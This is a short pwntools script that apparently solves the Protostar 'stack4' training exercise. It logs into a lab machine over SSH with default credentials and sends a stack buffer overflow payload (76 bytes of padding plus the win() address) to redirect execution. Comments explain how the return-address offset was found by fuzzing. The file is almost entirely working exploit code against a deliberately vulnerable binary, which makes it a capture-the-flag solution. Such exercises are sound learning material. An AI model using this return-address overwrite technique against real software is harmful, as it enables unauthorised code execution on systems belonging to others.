#!/usr/bin/python3
from pwn import *
# change port for your machine
s = ssh(host='172.16.17.27', user='user', password='user', port=22)
# overflowing the buffer modifies the stack
# win() function is at address 080483f4
# fuzzing to see where EIP is saved to with
# the command:
# $ python -c 'print "\x90"*64+"AAAABBBBCCCCDDDDEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"+"\xf4\x83\x04\x08"'
# shows us the program was redirected to 0x44444444
# hex for 44 is D so at that position is where the win() address should be
log.info(s['python -c \'print "a"*76+"\\xf4\\x83\\x04\\x08"\' | /opt/protostar/bin/stack4'].decode('utf-8'))
